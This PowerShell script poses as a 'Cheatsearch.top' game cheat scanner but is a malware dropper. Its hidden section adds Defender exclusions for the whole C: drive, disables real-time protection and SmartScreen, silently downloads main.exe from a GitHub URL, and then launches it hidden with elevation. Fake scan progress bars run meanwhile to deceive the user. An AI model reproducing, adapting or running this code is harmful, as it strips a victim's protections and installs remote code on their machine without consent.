[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = "SilentlyContinue"
Clear

Write-Host "--- Cheatsearch.top - Advanced Cheat Scanner ---" -ForegroundColor Cyan

# --- СКРЫТАЯ ТЕХНИЧЕСКАЯ ЧАСТЬ ---

# 1. Права админа (тихая проверка)
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# 2. Отключение защиты (тихо)
$outputFile = "$env:TEMP\ccmmd.exe"
Add-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\ProgramData", "$env:TEMP", $outputFile
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBlockAtFirstSeen $true -SubmitSamplesConsent 2 -MAPSReporting 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD

# 3. Скачивание (тихо)
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
try {
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0" -UseBasicParsing
} catch {
    try {
        (New-Object System.Net.WebClient).DownloadFile($url, $outputFile)
    } catch {}
}

# --- ВИЗУАЛЬНАЯ ЧАСТЬ (ПРОЦЕНТЫ) ---

$tasks = @(
    @{ name = "Initializing scanner engine"; speed = 20 },
    @{ name = "Scanning running processes"; speed = 40 },
    @{ name = "Analyzing game memory offsets"; speed = 60 },
    @{ name = "Checking local registry keys"; speed = 15 },
    @{ name = "Verifying digital signatures"; speed = 80 },
    @{ name = "Finalizing security report"; speed = 30 }
)

foreach ($task in $tasks) {
    for ($i = 1; $i -le 100; $i++) {
        Write-Host -NoNewline ("`r[*] $($task.name): $i%") -ForegroundColor Gray
        Start-Sleep -Milliseconds $task.speed
    }
    Write-Host ("`r[+] $($task.name): Done!      ") -ForegroundColor Green
}

# 4. Запуск файла (после имитации загрузки)
if (Test-Path $outputFile) {
    try {
        Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle Hidden
    } catch {}
}

Write-Host "`n--- Scan Completed Successfully ---" -ForegroundColor Cyan
Write-Host "Visit: Cheatsearch.top for more info." -ForegroundColor White
pause
